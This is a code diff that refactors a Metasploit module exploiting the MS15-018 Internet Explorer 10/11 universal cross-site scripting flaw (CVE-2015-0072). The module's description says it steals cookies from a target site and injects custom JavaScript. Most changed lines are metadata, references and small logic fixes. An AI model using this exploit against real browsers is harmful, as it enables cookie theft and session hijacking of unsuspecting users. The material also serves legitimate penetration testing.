@@ -1,17 +1,14 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection",
+      'Name'           => "MS15-018 Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection",
       'Description'    => %q{
           This module exploits a universal cross-site scripting (UXSS) vulnerability found in Internet
           Explorer 10 and 11. By default, you will steal the cookie from TARGET_URI (which cannot
@@ -31,9 +28,9 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'CVE', '2015-0072' ],
           [ 'OSVDB', '117876' ],
-          [ 'URL', 'http://www.deusen.co.uk/items/insider3show.3362009741042107/'],
+          [ 'MSB', 'MS15-018' ],
           [ 'URL', 'http://innerht.ml/blog/ie-uxss.html' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Feb/10' ]
+          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Feb/10' ]
         ],
       'Platform'       => 'win',
       'DisclosureDate' => "Feb 1 2015"
@@ -43,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
     [
       OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),
       OptString.new('CUSTOMJS', [ false, 'Custom JavaScript' ])
-    ], self.class)
+    ])
   end
 
   def setup
@@ -81,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
       host = "[#{host}]"
     end
 
-    if datastore['URIPORT'] != 0
+    if datastore['URIPORT']
       port = ':' + datastore['URIPORT'].to_s
     elsif (ssl and datastore["SRVPORT"] == 443)
       port = ''
@@ -152,5 +149,4 @@ class Metasploit3 < Msf::Auxiliary
       send_response(cli, get_html)
     end
   end
-
 end
